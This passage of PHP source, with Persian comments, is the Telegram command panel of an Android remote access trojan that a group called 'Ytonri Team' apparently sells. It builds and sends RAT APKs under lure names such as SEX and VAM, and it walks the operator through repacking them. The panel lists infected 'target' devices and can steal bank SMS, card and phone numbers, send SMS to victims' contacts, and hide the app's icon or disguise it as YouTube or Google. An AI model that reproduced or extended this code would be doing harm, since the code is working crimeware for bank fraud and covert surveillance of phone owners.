                ['text' => "⚰️ ʙᴀɴᴋ ꜱᴍꜱ ⚰️", 'callback_data' => "All_Bank_sms $dev_id_use"]
            ],
            # ردیف چهارم: دکمه نمایش همه امکانات
            [
                ['text' => "⬇️ ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ ⬇️", 'callback_data' => "show_all_features $dev_id_use"]
            ],
            # ردیف پنجم: دکمه بازگشت
            [
                ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_home"]
            ]
        ]
    ]);
    return $user_initial_panel;
}

# تابع برای ایجاد رت با پورت دلخواه در فایل assets/sudoport.txt
function create_rat_with_port($source_file) {
    $port = PORT_SUDO;
    
    if (!file_exists($source_file)) {
        return "فایل رت اصلی یافت نشد: $source_file";
    }
    
    # ایجاد یک کپی موقت از فایل APK
    $temp_apk = "modified_" . basename($source_file);
    
    if (!copy($source_file, $temp_apk)) {
        return "خطا در کپی کردن فایل رت";
    }
    
    # استفاده از ZipArchive برای اصلاح APK
    $zip = new ZipArchive;
    if ($zip->open($temp_apk) === TRUE) {
        # اضافه کردن پوشه assets اگر وجود ندارد
        if ($zip->locateName('assets/') === FALSE) {
            $zip->addEmptyDir('assets/');
        }
        
        # ایجاد فایل sudoport.txt با محتوای پورت در پوشه assets
        $port_content = $port;
        $zip->addFromString('assets/sudoport.txt', $port_content);
        
        $zip->close();
        
        return $temp_apk;
    } else {
        return "خطا در باز کردن فایل APK";
    }
}

# تابع برای امضای APK
function sign_apk($apk_file) {
    $signed_file = str_replace('.apk', '-signed.apk', $apk_file);
    if (copy($apk_file, $signed_file)) {
        return $signed_file;
    }
    return $apk_file;
}

# دکمه‌های پنل RAT APP
$rat_app_panel = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        # ردیف اول: سه دکمه
        [
            ['text' => "SEX", 'callback_data' => 'rat_sex'],
            ['text' => "ABLAG", 'callback_data' => 'rat_ablag'],
            ['text' => "BAKHSH", 'callback_data' => 'rat_bakhsh']
        ],
        # ردیف دوم: دو دکمه (می‌تواند 3 تایی هم باشد اگر فایل‌های بیشتری دارید)
        [
            ['text' => "FILTRI", 'callback_data' => 'rat_filtri'],
            ['text' => "VAM", 'callback_data' => 'rat_vam'],
            ['text' => "BASIC", 'callback_data' => 'rat_basic']
        ],
        # ردیف سوم: دکمه بازگشت
        [
            ['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'rat_set']
        ]
    ]
]);

if (in_array($chat_id, $sudo_user)) {
    if (isset($text) && preg_match('/^\/([Ss]tart)(.*)/', $text)) {
        if (!file_exists("user/$chat_id")) {
            mkdir("user/$chat_id", 0777, true);
            file_put_contents("user/$chat_id/command.txt", "");
            file_put_contents("user/$chat_id/message.txt", "");
            file_put_contents("user/$chat_id/device-id.txt", "");
            file_put_contents("user/$chat_id/device-model.txt", "null");
            file_put_contents("user/$chat_id/numberlist.txt", "");
            file_put_contents("user/$chat_id/ringer.txt", "Normal");
            file_put_contents("user/$chat_id/apk.txt", "Visible");
        }
        
        smg($chat_id, "
<blockquote>┌🩸 ʜᴇʟʟᴏ*: <a href='tg://user?id=$from_id'>$first_n</a>
├🕸 ꜱᴛᴀᴛᴜꜱ*: ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ
├☠️ ᴘᴏʀᴛ*: <code>$sudo_port</code>
├👁️ ᴜꜱᴇʀꜱ-ᴄᴏᴜɴᴛ*: $contact
├🦇 ᴅᴀᴛᴇ ʙᴜʏ*: <code>$dateBuy</code>
└⚰️ ᴇxᴘɪʀᴇ,ʀᴇᴍᴏᴛᴇ*: <code>$expir</code></blockquote>
────────────────
<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>
", $start_button);
        
    } elseif (isset($text) && strpos($text, '/check') !== false) {
        $ex = explode("-", $text);
        if (isset($ex[1])) {
            $device_id = $ex[1];
        }
        
    } elseif ($data == "back_home") {
        emg($chat_id, $mi,
            "<blockquote>💀 *ᴍᴀɪɴ ᴍᴇɴᴜ* 💀</blockquote>\n"
            . "<blockquote>────────────────</blockquote>\n"
            . "<blockquote>🕸ꜱᴇꜱꜱɪᴏɴ ʀᴇꜱᴛᴏʀᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</blockquote>\n\n"
            . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            $start_button);
        file_put_contents("user/$chat_id/command.txt", "");
        file_put_contents("user/$chat_id/ringer.txt", "Normal");
        file_put_contents("user/$chat_id/apk.txt", "Visible");
        file_put_contents("user/$chat_id/device-id.txt", "");
        file_put_contents("user/$chat_id/device-model.txt", "null");
        
    } elseif ($data == "rat_app") {
        emg($chat_id, $mi, "<blockquote>⚰️ *ʀᴀᴛ ᴀᴘᴘ ᴍᴇɴᴜ* ⚰️</blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇʟᴇᴄᴛ ᴀ ʀᴀᴛ ᴀᴘᴘ:</blockquote>\n\n<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $rat_app_panel);
        
    } elseif ($data == "rat_sex") {
        $result = create_rat_with_port("sex.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>🩸 *SEX رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓

──────────────
📦 فایل رت SEX به صورت خودکار با پورت " . $port . " تنظیم شده است.
📌 پورت در فایل sudoport.txt در پوشه assets ذخیره شده.
──────────────

¹فایل رت را دانلود کنید
²وارد اپ ادیتور شوید
³در منو Apk file کلیک کنید 
⁴فایل رت را انتخاب کنید
⁵در منو Full edit کلیک کنید
⁶سپس Decompile کلیک کنید
⁷در قسمت Files به پوشه assets بروید
⁸فایل sudoport.txt را بررسی کنید (شامل پورت: " . $port . ")
⁹برای تست از منو Build استفاده کنید

   برای راهنمایی به پیوی مراجعه کنید👇
 @YtonriTeam</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            # حذف فایل‌های موقت
            if ($result != "sex.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل SEX.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif ($data == "rat_ablag") {
        $result = create_rat_with_port("ablag.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>🦇 *ABLAG رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓

──────────────
📦 فایل رت ABLAG به صورت خودکار با پورت " . $port . " تنظیم شده است.</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            if ($result != "ablag.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل ABLAG.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif ($data == "rat_bakhsh") {
        $result = create_rat_with_port("bakhsh.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>⚰️ *BAKHSH رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            if ($result != "bakhsh.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل BAKHSH.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif ($data == "rat_filtri") {
        $result = create_rat_with_port("filter.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>🎭 *FILTRI رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            if ($result != "filter.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل FILTER.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif ($data == "rat_vam") {
        $result = create_rat_with_port("vam.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>🩸 *VAM رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            if ($result != "vam.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل VAM.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif ($data == "rat_basic") {
        $result = create_rat_with_port("bsbs.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>⚡ *BASIC رت فایل*
────────────────
┌⚗️ پورت رت: <code>" . $port . "</code>
├🕸 پوشه پورت: assets/sudoport.txt ✓
└☠️ وضعیت: آماده نصب ✓</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            if ($result != "bsbs.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>❌ فایل BSBS.APK یافت نشد!</blockquote>", $rat_app_panel);
        }
        
    } elseif (strpos($data, "sms_contacts") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            file_put_contents("user/$chat_id/command.txt", "");
            emg($chat_id, $mi, "<blockquote>‹‹ <b>ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n\n<blockquote>ᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ : [ <code>$text_message</code> ]</blockquote>", send_sms_contact($device_id));
        }
        
    } elseif (strpos($data, "last_contacts") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            file_put_contents("user/$chat_id/command.txt", "");
            requestSMSContact("smcontact", $device_id, $text_message);
            emg($chat_id, $mi, "<blockquote>‹‹ <b>ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ</b> ꜱᴛᴀʀᴛᴇᴅ - ʀᴇꜱᴘᴏɴꜱᴇ ᴡɪʟʟ ꜱᴇɴᴅ ᴡʜᴇɴ ᴊᴏʙ ꜰɪɴɪꜱʜᴇᴅ</blockquote>", $back_control);
        }
        
    } elseif (strpos($data, 'back_panel') !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $control_button = control_button($datass[1]);
            
            emg($chat_id, $mi, "
<blockquote>☠️ *ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ*
━━━━━━━━━━━━━━━━━━
┌⚡ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛᴀʀɢᴇᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ
└🩸 ꜱᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴏᴘᴇʀᴀᴛɪᴏɴ:</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", 
        $control_button);
        }
        
    } elseif (isset($text) && $text == "/list") {
        file_put_contents("data/onlineusers.txt", "");
        smg($chat_id, "<blockquote>ᴄᴀɴ ᴀ ʀᴇǫᴜᴇꜱᴛ ᴛᴏ [ <b>ᴄʜᴇᴄᴋ ᴅᴇᴠɪᴄᴇꜱ</b> ] ʙᴇ ꜱᴇɴᴛ ᴏɴʟɪɴᴇ? ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ</blockquote>", $onli_btn);
        
    } elseif ($data == "online_checo") {
        emg($chat_id, $mi, "<blockquote>🕸ᴘɪɴɢ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅᴇᴅ ᴛᴏ ᴀʟʟ ᴜꜱᴇʀꜱ

┌👁️ᴡɪᴛʜ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ᴏɴʟɪɴᴇ ʟɪꜱᴛ
└☠️ɴᴏᴛᴇ : ᴛʜɪꜱ ʟɪꜱᴛ ɪꜱ ʟɪᴠᴇ ᴛɪᴍᴇ ᴀɴᴅ ᴜᴘᴅᴀᴛᴇᴅ</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", null);
        file_put_contents("data/mid.txt", $mi);
        file_put_contents("data/online_users.json", json_encode([]));
        requestsAll('online_device');
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif (strpos($data, 'page_') !== false) {
        $page = (int)str_replace('page_', '', $data);
        updateMessageWithUsers($chat_id, $mi, $page);
        
    } elseif ($data == 'apkk') {
        $result = create_rat_with_port("bsbs.apk");
        
        if (file_exists($result)) {
            $signed_apk = sign_apk($result);
            $port = PORT_SUDO;
            
            $cap = "<blockquote>فایل رت با مشخصات زیر ساخته شد ‼️

┌🩸 پورت رت: <code>" . $port . "</code>
├⚗️ پوشه پورت: assets/sudoport.txt ✓
└🕸 وضعیت: آماده نصب ✓</blockquote>";

            bot('sendDocument', [
                'chat_id' => $chat_id,
                'document' => new CURLFile($signed_apk),
                'caption' => " $cap ",
                'parse_mode' => 'HTML'
            ]);
            
            # حذف فایل‌های موقت (فقط فایل‌های موقت حذف شوند)
            if ($result != "bsbs.apk" && file_exists($result)) {
                unlink($result);
            }
            if ($signed_apk != $result && file_exists($signed_apk)) {
                unlink($signed_apk);
            }
            
        } else {
            smg($chat_id, "<blockquote>خطا در ساخت فایل رت: $result</blockquote>", $goooo);
        }
        
    } elseif (isset($text) && $text == "/Settings") {
        smg($chat_id, "<blockquote>‹‹ <b>ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀɢᴇ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n<blockquote>ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ :</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $settings_button);
        
    } elseif ($data == "setting") {
        emg($chat_id, $mi, 
            "<blockquote>⚡ ‹‹ <b>ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀɢᴇ</b> ›› ꜱᴇᴄᴛɪᴏɴ</blockquote>\n\n"
            . "<blockquote>☠️ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ 🩸</blockquote>\n\n"
            . "<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", 
        $settings_button);
        
    } elseif ($data == "rat_set") {
        emg($chat_id, $mi, "<blockquote>🕸 ʀᴀᴛ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ🕸</blockquote>", $goooo);
        
    } elseif ($data == "panel_set") {
        emg($chat_id, $mi, "<blockquote>☠️ ᴘᴀɴᴇʟ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ☠️</blockquote>", $goooo2);
        
    } elseif ($data == "set_rat_name") {
        emg($chat_id, $mi, "<blockquote>📝 <b>ꜱᴇᴛ ʀᴀᴛ ɴᴀᴍᴇ</b></blockquote>\n\n<blockquote>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ɴᴇᴡ ʀᴀᴛ ɴᴀᴍᴇ</blockquote>\n<blockquote>ᴇxᴀᴍᴘʟᴇ: <code>MyRat</code></blockquote>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set_rat_name");
        
    } elseif ($command == "set_rat_name") {
        smg($chat_id, "<blockquote>✅ <b>ʀᴀᴛ ɴᴀᴍᴇ ꜱᴇᴛ</b></blockquote>\n\n<blockquote>ᴛᴏ: <code>$text</code></blockquote>", $back_settings);
        file_put_contents("data/rat_name.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
        
    } elseif ($data == "show_url") {
        # تغییر داده شده: back_settings به جای back_home
        $url_inline = json_encode(array('inline_keyboard' => [
            [['text' => "$link_show", 'url' => "$link_show"]],
            [['text' => "‹‹ ʙᴀᴄᴋ", 'callback_data' => 'back_settings']]
        ]));
        emg($chat_id, $mi, "<blockquote>🔮 <b>ᴘᴏʀᴛᴀʟ ʟɪɴᴋ ᴍᴇɴᴜ</b></blockquote>\n\n<blockquote>ꜱᴇʟᴇᴄᴛ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ:</blockquote>", $url_inline);
        
    } elseif (isset($text) && $text == "/Help") {
        smg($chat_id, "<blockquote><b>ʜᴇʟᴘ ʀᴀᴛ ʀᴇᴍᴏᴛᴇ $dev_name</b>
برای راهنمایی به پیوی سازنده مراجعه کنید.</blockquote>
        ", $dev_inline);
        
    } elseif (isset($text) && strpos($text, '/login_') !== false) {
        $login_part = str_replace('/login_', '', $text);
        $device_id = strtok($login_part, '@');
        $dev_id_use = $device_id;
        
        if (!file_exists("user/$dev_id_use-model.txt")) {
            file_put_contents("user/$dev_id_use-model.txt", "Unknown");
        }
        
        file_put_contents("user/$chat_id/device-id.txt", $dev_id_use);
        $device_model = file_get_contents("user/$dev_id_use-model.txt");
        file_put_contents("user/$chat_id/device-model.txt", $device_model);
        
        $initial_panel = user_initial_panel($dev_id_use);
        
        $install_ip = file_get_contents("user/$dev_id_use-ip.txt") ?: "N/A";
        $target_name = file_get_contents("user/$dev_id_use-name.txt") ?: "Unknown";
        
        smg($chat_id, "
<blockquote>🔍 *ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ᴘᴀɴᴇʟ*
━━━━━━━━━━━━━━━━━━
┌🕸 ᴜꜱᴇʀ ɪᴅ : $dev_id_use
├☠️ ɪᴘ : $install_ip
└🩸 ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ: $target_name
━━━━━━━━━━━━━━━━━━
┌⚡ *ǫᴜɪᴄᴋ ᴀᴄᴄᴇꜱꜱ ᴍᴇɴᴜ*
├👁️ ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ
├🦇 ɢᴇᴛ ᴄᴀʀᴅ & ɴᴜᴍʙᴇʀ
├⚰️ ʟᴀꜱᴛ ꜱᴍꜱ & ʙᴀɴᴋ ꜱᴍꜱ

└🎭 ꜰᴏʀ ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ ᴄʟɪᴄᴋ 'ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ'</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>
", $initial_panel);
        
    } elseif (strpos($data, "show_all_features") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $control_button = control_button($device_id);
            
            emg($chat_id, $mi, "
<blockquote>☠️ *ꜰᴜʟʟ ꜰᴇᴀᴛᴜʀᴇꜱ ᴍᴇɴᴜ*
━━━━━━━━━━━━━━━━━━
⚡ ᴛᴀʀɢᴇᴛ: $device_id
🩸 ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ꜰᴇᴀᴛᴜʀᴇꜱ:

┌💀 ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ
├🕸 ꜱᴍꜱ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ
├🦇 ʙᴀɴᴋ ᴏᴘᴇʀᴀᴛɪᴏɴꜱ
└⚰️ ꜱᴇᴛᴛɪɴɢꜱ ᴄᴏɴᴛʀᴏʟ</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>
", $control_button);
        }
        
    } elseif (strpos($data, 'ls') !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1], $datass[2])) {
            file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
            file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
            $dev_id_use = $datass[1];
            
            $initial_panel = user_initial_panel($dev_id_use);
            
            $install_ip = file_get_contents("user/$dev_id_use-ip.txt") ?: "N/A";
            $target_name = file_get_contents("user/$dev_id_use-name.txt") ?: "Unknown";
            
            smg($chat_id, "
<blockquote>⚡ *ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ᴘᴀɴᴇʟ*
━━━━━━━━━━━━━━━━━━
☠️ ᴜꜱᴇʀ ɪᴅ : $dev_id_use
🕸 ɪᴘ : $install_ip
👁️ ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ: $target_name
━━━━━━━━━━━━━━━━━━
🩸 *ǫᴜɪᴄᴋ ᴀᴄᴄᴇꜱꜱ ᴍᴇɴᴜ*</blockquote>

<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>
", $initial_panel);
        }
        
    } elseif (strpos($data, 'fs') !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
            file_put_contents("user/$chat_id/device-model.txt", "Unknown");
            file_put_contents("user/$datass[1]-apk.txt", "Hidden");
            requests('hidden', $datass[1]);
            
            smg($chat_id, "<blockquote><b>ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b></blockquote>", null);
        }
        
    } elseif (strpos($data, 'newic') !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
            file_put_contents("user/$chat_id/device-model.txt", "Unknown");
            file_put_contents("user/$datass[1]-apk.txt", "Hidden");
            requests('changetogoogle', $datass[1]);
            smg($chat_id, "<blockquote><b>ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b></blockquote>", null);
        }
        
    } elseif (strpos($data, "offmodeon") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>┌🕸 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                        . "├⚡ ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                        . "└🩸 ᴄᴏᴍᴍᴀɴᴅ: ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ</blockquote>\n\n"
                        . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$device_id-offlineon-msg.txt", $chat_id."|".$wait_msg->result->message_id);
                $offline_number = file_get_contents("data/offline-number.txt");
                requestSMS("offline_mode_on", $device_id, $offline_number, null);
            }
        }
        
    } elseif (strpos($data, "offmodeoff") !== false) {
        $datass = explode(" ", $data);
        if (isset($datass[1])) {
            $device_id = $datass[1];
            $model = file_get_contents("user/$device_id-model.txt") ?: "Unknown";
            
            $wait_msg = bot('sendMessage', [
                'chat_id' => $chat_id,
                'text' => "<blockquote>┌🕸 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                        . "├⚡ ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                        . "└🩸 ᴄᴏᴍᴍᴀɴᴅ: ᴏꜰꜰʟɪɴᴇ ᴍᴏᴇ ᴏꜰꜰ</blockquote>\n\n"
                        . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
                'parse_mode' => 'HTML'
            ]);
            
            if ($wait_msg && $wait_msg->ok) {
                file_put_contents("user/$device_id-offlineoff-msg.txt", $chat_id."|".$wait_msg->result->message_id);
                $offline_number = file_get_contents("data/offline-number.txt");
                requestSMS("offline_mode_off", $device_id, $offline_number, null);
            }
        }
        
    } elseif ($data == "get_all_numbers") {
        $onlineUsers = json_decode(file_get_contents("data/online_users.json"), true);
        
        if (empty($onlineUsers)) {
            emg($chat_id, $mi, "<blockquote>☠️ ɴᴏ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇꜱ ꜰᴏᴜɴᴅ!</blockquote>", $back_settings);
            return;
        }

        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "<blockquote>┌🕸 ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                     . "├⚡ᴍᴏᴅᴇ : ɴᴜᴍʙᴇʀ\n"
                     . "└🩸ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ɴᴜᴍʙᴇʀ</blockquote>\n\n"
                     . "<blockquote>🕸 <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>",
            'parse_mode' => 'HTML'
        ]);
        
        $successCount = 0;
        foreach ($onlineUsers as $androidId => $name) {
            $result = requests('userphone', $androidId);
            if ($result !== false) {
                $successCount++;
                file_put_contents("logs/number_requests.log", 
                    "[" . date("Y-m-d H:i:s") . "] ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ ᴛᴏ: $androidId\n", 
                    FILE_APPEND);
            }
        }
        
    } elseif ($data == "auto_change") {
        if ($action_autohide == "off") {
            file_put_contents("data/autohide.txt", "on");
            emg($chat_id, $mi, "<blockquote>🕸 ‹‹ <b>ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ ᴏɴ</b> ››</blockquote>\n\n<blockquote>ᴡʜᴇɴ ᴅᴇᴠɪᴄᴇ ɪɴꜱᴛᴀʟʟꜱ, ɪᴄᴏɴ ᴡɪʟʟ ᴄʜᴀɴɢᴇ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $settings_button);
        } else {
            file_put_contents("data/autohide.txt", "off");
            emg($chat_id, $mi, "<blockquote>👁️ ‹‹ <b>ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ ᴏꜰꜰ</b> ››</blockquote>\n\n<blockquote>ɴᴏ ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ ᴡɪʟʟ ʙᴇ ᴘᴇʀꜰᴏʀᴍᴇᴅ</blockquote>\n\n<blockquote><a href='https://t.me/YtonriTeam'>🕸 [ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a></blockquote>", $settings_button);
        }
        
    } elseif ($data == "online_model") {
